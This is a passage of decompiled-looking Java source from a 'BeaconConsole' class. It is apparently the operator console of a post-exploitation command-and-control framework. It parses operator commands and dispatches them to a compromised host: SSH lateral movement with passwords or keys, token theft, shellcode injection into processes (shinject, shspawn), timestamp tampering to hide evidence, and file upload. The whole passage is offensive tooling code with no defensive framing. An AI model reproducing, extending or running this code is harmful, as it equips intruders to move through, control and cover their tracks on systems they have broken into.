                    public void dialogResult(String string) {
                        BeaconConsole.this.master.SpawnUnder(n, string);
                    }
                });
                scListenerChooser.show();
            }
        } else if (commandParser.is("spawnto")) {
            if (commandParser.empty()) {
                this.master.SpawnTo();
            } else if (commandParser.verify("XZ")) {
                String string112 = commandParser.popString();
                String string113 = commandParser.popString();
                this.master.SpawnTo(string113, string112);
            }
        } else if (commandParser.is("ssh")) {
            if (commandParser.verify("AAZ")) {
                String string114 = commandParser.popString();
                String string115 = commandParser.popString();
                String string116 = commandParser.popString();
                String string117 = CommonUtils.Host(string116);
                int n = CommonUtils.Port(string116, 22);
                this.master.SecureShell(string115, string114, string117, n);
            }
        } else if (commandParser.is("ssh-key")) {
            if (commandParser.verify("AAF")) {
                String string118 = commandParser.popString();
                String string119 = commandParser.popString();
                String string120 = commandParser.popString();
                String string121 = CommonUtils.Host(string120);
                int n = CommonUtils.Port(string120, 22);
                byte[] arrby = CommonUtils.readFile(string118);
                if (arrby.length > 6140) {
                    commandParser.error("key file " + string118 + " is too large");
                } else {
                    this.master.SecureShellPubKey(string119, arrby, string121, n);
                }
            } else if (commandParser.isMissingArguments() && commandParser.verify("AA")) {
                final String string122 = commandParser.popString();
                String string123 = commandParser.popString();
                final String string124 = CommonUtils.Host(string123);
                final int n = CommonUtils.Port(string123, 22);
                SafeDialogs.openFile("Select PEM file", null, null, false, false, new SafeDialogCallback() {

                    @Override
                    public void dialogResult(String string) {
                        String string2 = string;
                        byte[] arrby = CommonUtils.readFile(string2);
                        BeaconConsole.this.master.SecureShellPubKey(string122, arrby, string124, n);
                    }
                });
            }
        } else if (commandParser.is("steal_token")) {
            if (commandParser.verify("I")) {
                this.master.StealToken(commandParser.popInt());
            }
        } else if (commandParser.is("shinject")) {
            if (commandParser.verify("IXF") || commandParser.reset()) {
                String string125 = commandParser.popString();
                String string126 = commandParser.popString();
                int n = commandParser.popInt();
                this.master.ShellcodeInject(n, string126, string125);
            } else if (commandParser.verify("IX")) {
                final String string127 = commandParser.popString();
                final int n = commandParser.popInt();
                SafeDialogs.openFile("Select shellcode to inject", null, null, false, false, new SafeDialogCallback() {

                    @Override
                    public void dialogResult(String string) {
                        BeaconConsole.this.master.ShellcodeInject(n, string127, string);
                    }
                });
            }
        } else if (commandParser.is("shspawn")) {
            if (commandParser.verify("XF") || commandParser.reset()) {
                String string128 = commandParser.popString();
                String string129 = commandParser.popString();
                this.master.ShellcodeSpawn(string129, string128);
            } else if (commandParser.verify("X")) {
                final String string130 = commandParser.popString();
                SafeDialogs.openFile("Select shellcode to inject", null, null, false, false, new SafeDialogCallback() {

                    @Override
                    public void dialogResult(String string) {
                        BeaconConsole.this.master.ShellcodeSpawn(string130, string);
                    }
                });
            }
        } else if (commandParser.is("timestomp")) {
            if (commandParser.verify("AA")) {
                String string131 = commandParser.popString();
                String string132 = commandParser.popString();
                this.master.TimeStomp(string132, string131);
            }
        } else if (commandParser.is("unlink")) {
            if (commandParser.verify("AI") || commandParser.reset()) {
                String string133 = commandParser.popString();
                String string134 = commandParser.popString();
                this.master.Unlink(string134, string133);
            } else if (commandParser.verify("Z")) {
                this.master.Unlink(commandParser.popString());
            }
        } else if (commandParser.is("upload") && commandParser.empty()) {
            SafeDialogs.openFile("Select file to upload", null, null, false, false, new SafeDialogCallback() {

                @Override
                public void dialogResult(String string) {
                    BeaconConsole.this.master.Upload(string);
                }
            });
        } else if (commandParser.is("upload")) {
            if (commandParser.verify("f")) {
                this.master.Upload(commandParser.popString());
            }
        } else {
            // this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Error(this.bid, "Unknown command: " + string)));
            this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Error(this.bid, "Unknown command: " + str1)));
        }
        if (commandParser.hasError()) {
            this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Error(this.bid, commandParser.error())));
        }
    }


}
